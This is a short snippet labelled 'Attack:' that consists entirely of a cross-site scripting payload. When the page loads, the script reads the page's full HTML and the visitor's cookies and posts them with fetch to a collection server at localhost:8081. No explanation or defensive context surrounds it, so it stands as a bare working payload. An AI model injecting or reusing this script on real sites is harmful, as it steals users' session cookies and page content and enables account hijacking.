Attack:

<script>
window.addEventListener('load', function () {
  fetch("http://localhost:8081", {
    method: "POST",
    body: JSON.stringify(document.body.outerHTML) + document.cookie
});
})
</script>